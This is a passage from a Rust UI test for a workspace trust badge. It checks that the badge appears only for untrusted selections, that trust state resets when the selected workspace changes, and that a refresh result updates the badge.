    // In the header: the badge is shown for an untrusted selection only, and
    // a result judged for another workspace is not kept when the selection moves.
    let h = open(cx, install_loaded);
    frame(cx, &h, |window| {
        assert!(
            window.find("trust-badge").visible(),
            "main is untrusted here"
        );
    });
    update(cx, &h, |s, cx| {
        s.selection.current_mut().unwrap().trust = Some(TrustState::Trusted);
        cx.notify();
    });
    frame(cx, &h, |window| {
        assert!(window.try_find("trust-badge").is_none());
    });
    update(cx, &h, |s, cx| s.select_workspace("feature-x".into(), cx));
    cx.read_entity(&h.state, |s, _| {
        assert!(
            s.selection.current().unwrap().trust.is_none(),
            "the state of the previous workspace is not carried over"
        );
    });
    let stamp = update(cx, &h, |s, _| {
        s.selection.current_mut().unwrap().begin_refresh()
    });
    let result: Result<Refreshed, LoadError> = {
        let mut refreshed = refreshed(&h, cx, "web");
        refreshed.trust = Ok(TrustState::Untrusted {
            digest: "x".into(),
            previously_trusted: true,
            format_changed: false,
        });
        Ok(refreshed)
    };
    update(cx, &h, |s, cx| {
        s.inflight = MAX_JOBS + 1;
        s.apply_refresh(stamp, false, result, cx)
    });
    frame(cx, &h, |window| {
        assert!(
            window.find("trust-badge").visible(),
            "feature-x is untrusted"
        );
    });
}
